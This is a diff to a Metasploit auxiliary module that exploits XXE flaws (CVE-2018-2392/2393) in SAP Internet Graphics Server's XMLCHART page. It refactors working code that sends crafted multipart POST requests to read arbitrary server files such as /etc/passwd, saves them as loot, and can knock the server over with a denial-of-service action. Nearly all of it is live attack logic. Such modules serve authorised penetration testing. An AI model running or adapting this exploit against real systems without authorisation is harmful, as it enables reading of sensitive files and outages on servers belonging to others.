@@ -16,11 +16,12 @@ class MetasploitModule < Msf::Auxiliary
           'Description' => %q{
             This module exploits CVE-2018-2392 and CVE-2018-2393, two XXE vulnerabilities within the XMLCHART page
             of SAP Internet Graphics Servers (IGS) running versions 7.20, 7.20EXT, 7.45, 7.49, or 7.53. Successful
-            exploitation will allow unauthenticated remote attackers to read files from the server as the XXX user,
-            or conduct a denial of service attack against the vulnerable SAP IGS server.
+            exploitation will allow unauthenticated remote attackers to read files from the server as the user from which
+            the IGS service is started, which will typically be the SAP admin user. Alternatively attackers may also
+            be able to abuse the XXE to conduct a denial of service attack against the vulnerable SAP IGS server.
           },
           'Author' => [
-            'Yvan Genuer', # @_1ggy The Security Researcher who originally found the vulnerability
+            'Yvan Genuer', # @_1ggy The researcher who originally found this vulnerability
             'Vladimir Ivanov' # @_generic_human_ This Metasploit module
           ],
           'License' => MSF_LICENSE,
@@ -35,7 +36,7 @@ class MetasploitModule < Msf::Auxiliary
           ],
           'DefaultAction' => 'READ',
           'DefaultOptions' => {
-            'SSL' => false # Disable SSL (by default SAP IGS not use SSL/TLS)
+            'SSL' => false # Disable SSL (by default SAP IGS does not use SSL/TLS)
           },
           'DisclosureDate' => '2018-03-14'
         )
@@ -43,7 +44,7 @@ class MetasploitModule < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(40080),
-        OptString.new('FILE', [ true, 'File to read from the remote server', '/etc/passwd']),
+        OptString.new('FILE', [ false, 'File to read from the remote server', '/etc/passwd']),
         OptString.new('PATH', [ true, 'Path to the SAP IGS XMLCHART page from the web root', '/XMLCHART']),
       ]
     )
@@ -52,7 +53,7 @@ class MetasploitModule < Msf::Auxiliary
   def setup_xml_and_variables
     @host = @datastore['RHOSTS']
     @port = @datastore['RPORT']
-    @urn = @datastore['PATH']
+    @path = @datastore['PATH']
     @file = @datastore['FILE']
     if datastore['SSL']
       @schema = 'https://'
@@ -60,7 +61,7 @@ class MetasploitModule < Msf::Auxiliary
       @schema = 'http://'
     end
     @data_xml = {
-      name: 'data',
+      name: Rex::Text.rand_text_alphanumeric(12),
       filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
       data: nil
     }
@@ -69,14 +70,14 @@ class MetasploitModule < Msf::Auxiliary
       <Categories>
         <Category>ALttP</Category>
       </Categories>
-      <Series label="Hyrule">
+      <Series label="#{Rex::Text.rand_text_alphanumeric(6)}">
         <Point>
           <Value type="y">#{Rex::Text.rand_text_numeric(4)}</Value>
         </Point>
       </Series>
     </ChartData>)
     @xxe_xml = {
-      name: 'custo',
+      name: Rex::Text.rand_text_alphanumeric(12),
       filename: Rex::Text.rand_text_alphanumeric(12) + '.xml',
       data: nil
     }
@@ -145,13 +146,43 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_file_content(html_response)
-    file_content = html_response.gsub('<area shape=rect coords="0, 0,0, 0" ', '')
-    @file_content = file_content.gsub('>', '')
+    if (file_content_regex = html_response.match(/^<area shape=rect coords="0, 0,0, 0" (?<file_content>[^\b]+?)>\r\n$/))
+      @file_content = file_content_regex[:file_content]
+    else
+      @file_content = nil
+    end
   end
 
-  def analyze_first_response(html_response, check = false)
+  def send_first_request
+    # Send first HTTP request
+    begin
+      first_response = nil
+      first_response = send_request_cgi(
+        {
+          'uri' => normalize_uri(@path),
+          'method' => 'POST',
+          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
+          'data' => @post_data.to_s
+        }
+      )
+    rescue StandardError => e
+      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@path}")
+      vprint_error("Error #{e.class}: #{e}")
+    end
+
+    # Check first HTTP response
+    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !first_response.body.match?(/ImageMap|Errors/)
+      return Exploit::CheckCode::Safe
+    end
+
+    first_response
+  end
+
+  def analyze_first_response(html_response, file_name)
     get_download_link(html_response)
-    if @download_link
+    if !@download_link.to_s.empty?
+
+      # Send second HTTP request
       begin
         second_response = nil
         second_response = send_request_cgi(
@@ -164,10 +195,15 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@download_link}")
         vprint_error("Error #{e.class}: #{e}")
       end
-      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") if second_response.nil? || second_response.code != 200
+
+      # Check second HTTP response
+      if second_response.nil? || second_response.code != 200 || !second_response.body.include?('area shape=rect')
+        return Exploit::CheckCode::Safe
+      end
+
       get_file_content(second_response.body)
-    elsif !check
-      print_status("System is vulnerable, but the file #{@file} was not found on the host #{@host}")
+    else
+      print_status("System is vulnerable, but the file #{file_name} was not found on the host #{@host}")
     end
   end
 
@@ -178,30 +214,10 @@ class MetasploitModule < Msf::Auxiliary
     make_post_data('/etc/os-release', false) # Create a XML data payload to retrieve the value of /etc/os-release
     # so that the module can check if the target is vulnerable or not.
 
-    # Send HTTP request
-    begin
-      check_response = nil
-      check_response = send_request_cgi(
-        {
-          'uri' => normalize_uri(@urn),
-          'method' => 'POST',
-          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
-          'data' => @post_data.to_s
-        }
-      )
-    rescue StandardError => e
-      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
-      vprint_error("Error #{e.class}: #{e}")
-    end
-
-    # Check HTTP response
-    if check_response.nil? || check_response.code != 200 || !(check_response.body.include?('Picture') && check_response.body.include?('Info')) || !check_response.body.match?(/ImageMap|Errors/)
-      return Exploit::CheckCode::Safe
-    end
-
     # Get OS release information
+    check_response = send_first_request
     os_release = ''
-    analyze_first_response(check_response.body, true)
+    analyze_first_response(check_response.body, '/etc/os-release')
     if @file_content
       if (os_regex = @file_content.match(/^PRETTY_NAME.*=.*"(?<os>.*)"$/))
         os_release = "OS info: #{os_regex[:os]}"
@@ -232,7 +248,7 @@ class MetasploitModule < Msf::Auxiliary
       info: os_release
     )
 
-    Exploit::CheckCode::Vulnerable(os_release)
+    Exploit::CheckCode::Vulnerable("#{@host} returned a response indicating that its XMLCHART page is vulnerable to XXE! #{os_release}")
 
   end
 
@@ -253,43 +269,31 @@ class MetasploitModule < Msf::Auxiliary
     setup_xml_and_variables
     make_post_data(@file, false)
 
-    # Send HTTP request
-    begin
-      first_response = nil
-      first_response = send_request_cgi(
-        {
-          'uri' => normalize_uri(@urn),
-          'method' => 'POST',
-          'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
-          'data' => @post_data.to_s
-        }
-      )
-    rescue StandardError => e
-      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
-      vprint_error("Error #{e.class}: #{e}")
-    end
-
-    # Check first HTTP response
-    if first_response.nil? || first_response.code != 200 || !(first_response.body.include?('Picture') && first_response.body.include?('Info')) || !first_response.body.match?(/ImageMap|Errors/)
-      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}")
-    end
-
-    # Report Vulnerability
-    report_vuln(
-      host: @host,
-      port: @port,
-      name: name,
-      refs: references
-    )
-
     # Download remote file
-    analyze_first_response(first_response.body)
+    first_response = send_first_request
+    analyze_first_response(first_response.body, @file)
     if @file_content
       vprint_good("File: #{@file} content from host: #{@host}\n#{@file_content}")
-      loot = store_loot('sap.igs.xxe', 'text/plain', @host, @file_content, @file, 'SAP IGS XXE')
+      loot = store_loot('sap.igs.xmlchart.xxe', 'text/plain', @host, @file_content, @file, 'SAP IGS XMLCHART XXE')
       print_good("File: #{@file} saved in: #{loot}")
+
+      # Report Service and Vulnerability
+      report_service(
+        host: @host,
+        port: @port,
+        name: 'http',
+        proto: 'tcp',
+        info: 'SAP Internet Graphics Server (IGS)'
+      )
+      report_vuln(
+        host: @host,
+        port: @port,
+        name: name,
+        refs: references
+      )
+
     else
-      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}")
+      fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@path}")
     end
 
   end
@@ -305,27 +309,37 @@ class MetasploitModule < Msf::Auxiliary
       dos_response = nil
       dos_response = send_request_cgi(
         {
-          'uri' => normalize_uri(@urn),
+          'uri' => normalize_uri(@path),
           'method' => 'POST',
           'ctype' => "multipart/form-data; boundary=#{@post_data.bound}",
           'data' => @post_data.to_s
         }, 10
       )
     rescue Timeout::Error
+      print_good("Successfully managed to DOS the SAP IGS server at #{@host}:#{@port}")
+
+      # Report Service and Vulnerability
+      report_service(
+        host: @host,
+        port: @port,
+        name: 'http',
+        proto: 'tcp',
+        info: 'SAP Internet Graphics Server (IGS)'
+      )
       report_vuln(
         host: @host,
         port: @port,
         name: name,
         refs: references
       )
-      print_good("Successfully managed to DOS the SAP IGS server at #{@host}:#{@port}")
+
     rescue StandardError => e
-      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@urn}")
+      print_error("Failed to retrieve SAP IGS page: #{@schema}#{@host}:#{@port}#{@path}")
       vprint_error("Error #{e.class}: #{e}")
     end
 
     # Check HTTP response
-    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@urn}") unless dos_response.code != 200
+    fail_with(Failure::NotVulnerable, "#{@schema}#{@host}:#{@port}#{@path}") unless dos_response.code != 200
 
   end
 
